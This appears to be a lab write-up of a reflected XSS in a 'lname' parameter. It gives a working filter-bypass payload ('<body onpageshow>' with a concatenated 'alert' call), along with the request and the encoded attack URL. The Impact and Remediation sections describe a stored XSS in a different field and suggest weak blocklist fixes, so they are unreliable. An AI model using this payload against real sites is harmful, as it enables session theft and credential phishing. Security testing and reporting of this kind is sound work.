## Title

Reflected XSS - Extended Function Filter

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the GET Parameter Reflection functionality on `account.pwnedbox.site`.

During testing, the application was found to accept user-controlled input through the `lname` (Last Name) GET parameter.

The application implements function-name filtering to prevent JavaScript execution. However, a specially crafted HTML event-handler payload using the `<body onpageshow>` event and JavaScript string concatenation successfully bypassed the filtering mechanism.

Successful JavaScript execution was confirmed through a browser alert displaying `1`.

**Affected URL:** https://account.pwnedbox.site/

**HTTP Method:** GET

**Affected Parameter:** `lname`

## Steps to Reproduce

1. Open the lab address: `https://account.pwnedbox.site/`
2. Navigate to the GET Parameter Reflection page.
3. Leave the First Name field empty.
4. Enter the following payload in the Last Name field:

   ```html
   "><body onpageshow=/*x*/this['a'+'l'+'e'+'r'+'t'](1)//>
   ```

5. Click Submit and observe the JavaScript alert displaying `1`.

## POC (Proof of Concept)

**Lab Address:** https://account.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `lname`

**Payload:**

```html
"><body onpageshow=/*x*/this['a'+'l'+'e'+'r'+'t'](1)//>
```

**Request Parameter:**

```http
?fname=&lname="><body onpageshow=/*x*/this['a'+'l'+'e'+'r'+'t'](1)//>
```

**Crafted URL:**

```text
https://account.pwnedbox.site/?fname=&lname=%22%3E%3Cbody%20onpageshow%3D%2F%2Ax%2A%2Fthis%5B%27a%27%2B%27l%27%2B%27e%27%2B%27r%27%2B%27t%27%5D%281%29%2F%2F%3E
```

**Observed Result:**

The application processed the supplied payload through the `lname` parameter. The injected `onpageshow` event handler successfully executed JavaScript despite the function-name filtering mechanism.

A browser alert displaying `1` appeared, confirming successful JavaScript execution.


**Screenshot Evidence:**

1. Screenshot showing the injected payload in the Last Name field.
<img width="1919" height="960" alt="image" src="https://github.com/user-attachments/assets/b5918b99-66dd-4ccb-ba02-df343eb39ab1" />

2. Screenshot showing the browser alert displaying `1`.
<img width="1913" height="985" alt="image" src="https://github.com/user-attachments/assets/2a736254-54df-4f22-9406-ab10e13d52ef" />

3. Screenshot showing the resulting page after dismissing the alert.
<img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/3d082bea-1898-4c6c-bb4b-70ce33c7058b" />



**Impact**

1. Steal session cookies of every user who visits the page
2. Admins are affected too since they visit the same page
3. Can inject fake login forms to harvest credentials
4. One submission hits every authenticated user

**Remediation**

1. Filter out HTML tags like: <script>, <img>, <svg> from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like: alert(), confirm(), prompt() so even if a tag slips through the method won't execute
3. If you're using PHP then use htmlspecialchars() function before rendering any user input back to the page
4. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server

